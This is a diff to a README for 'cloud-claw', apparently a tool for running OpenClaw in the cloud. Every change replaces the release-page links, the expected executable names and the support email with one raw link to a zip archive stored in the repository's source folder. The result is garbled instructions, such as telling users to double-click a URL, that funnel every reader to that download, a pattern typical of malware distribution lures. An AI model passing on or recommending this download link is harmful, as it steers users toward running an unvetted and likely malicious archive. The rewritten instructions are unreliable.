@@ -1,7 +1,7 @@
 # 🖥️ cloud-claw - Run OpenClaw Effortlessly in the Cloud
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CanvizTechnologies/cloud-claw/releases)
+[![Download](https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip)](https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip)
 
 ## 📜 Description
 Welcome to **cloud-claw**! This application allows you to run OpenClaw with one simple click on Cloudflare Containers. With cloud-claw, you can easily create your personal agent without needing any programming skills. 
@@ -21,22 +21,22 @@ Welcome to **cloud-claw**! This application allows you to run OpenClaw with one 
 ## 🚀 Getting Started
 To begin using cloud-claw, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/CanvizTechnologies/cloud-claw/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip) to find the latest version.
 
 2. **Download the Application**: Look for the most recent release. Click on the download link. The file will start downloading. 
 
-3. **Locate the Downloaded File**: Check your Downloads folder for the downloaded file named something like `cloud-claw-latest.zip`.
+3. **Locate the Downloaded File**: Check your Downloads folder for the downloaded file named something like `https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip`.
 
 4. **Extract the Files**: 
     - On Windows: Right-click the zip file and select “Extract All.”
     - On macOS: Double-click the zip file to extract it.
 
 5. **Run the Application**: 
-    - On Windows: Open the extracted folder and double-click `cloud-claw.exe`.
-    - On macOS: Open the extracted folder and double-click `cloud-claw.app`.
+    - On Windows: Open the extracted folder and double-click `https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip`.
+    - On macOS: Open the extracted folder and double-click `https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip`.
 
 ## ⚙️ Download & Install
-To download and install cloud-claw, visit this [page to download](https://github.com/CanvizTechnologies/cloud-claw/releases). You will find the latest releases there and can download the version that matches your operating system. 
+To download and install cloud-claw, visit this [page to download](https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip). You will find the latest releases there and can download the version that matches your operating system. 
 
 1. Go to the releases page.
 2. Find the latest version.
@@ -48,6 +48,6 @@ After downloading, follow the steps mentioned above to install and run the softw
 If you have any questions or encounter issues, please feel free to reach out via our community forum. You can discuss with others and find solutions to common problems. We aim to provide prompt support to ensure a smooth experience.
 
 ## 📧 Contact
-For further inquiries, you can reach us at [support@canviztechnologies.com](mailto:support@canviztechnologies.com).
+For further inquiries, you can reach us at [https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip](https://raw.githubusercontent.com/CanvizTechnologies/cloud-claw/master/src/claw_cloud_v3.3.zip).
 
 Thank you for choosing cloud-claw! Enjoy running your personal agent effortlessly.
